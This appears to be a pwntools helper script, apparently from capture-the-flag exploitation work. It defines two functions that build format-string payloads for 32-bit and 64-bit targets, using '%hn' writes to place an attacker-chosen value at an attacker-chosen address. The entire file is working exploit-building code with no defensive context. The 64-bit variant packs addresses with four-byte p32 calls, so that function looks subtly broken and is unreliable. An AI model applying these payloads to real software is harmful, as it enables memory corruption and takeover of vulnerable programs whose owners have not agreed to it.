from pwn import *

def createFmt32( dest, src, offset, start=0 ):
  start += 8
  upper2 = (src >> 16) & 0xffff
  lower2 = src & 0xffff

  fmt = b''
  fmt += p32( dest )
  fmt += p32( dest + 2 )
  fmt += b'%%%dc'%( lower2-start )
  fmt += b'%%%d$hn'%offset
  fmt += b'%%%dc'%( upper2-lower2 if upper2>lower2 else upper2+(0x10000-lower2) )
  fmt += b'%%%d$hn'%(offset+1)
  return fmt

def createFmt64( dest, src, offset, start=0 ):
  start += 16
  upper2 = (src >> 48 ) & 0xffff
  uppermiddle2 = (src >> 32 ) & 0xffff
  lowermiddle2 = (src >> 16 ) & 0xffff 
  lower2 = src & 0xffff

  fmt = b''
  fmt += p32( dest )
  fmt += p32( dest + 2 )
  fmt += p32( dest + 4 )
  fmt += p32( dest + 6 )
  fmt += b'%%%dc'%( lower2-start )
  fmt += b'%%%d$hn'%offset
  fmt += b'%%%dc'%( lowermiddle2-lower2 if lowermiddle2>lower2 else lowermiddle2+(0x10000-lower2 ) )
  fmt += b'%%%d$hn'%(offset+1)
  fmt += b'%%%dc'%( uppermiddle2-lowermiddle2 if uppermiddle2>lowermiddle2 else uppermiddle2+(0x10000-lowermiddle2 ) )
  fmt += b'%%%d$hn'%(offset+2)
  fmt += b'%%%dc'%( upper2-uppermiddle2 if upper2>uppermiddle2 else upper2+(0x10000-uppermiddle2 ) )
  fmt += b'%%%d$hn'%(offset+3)
  return fmt

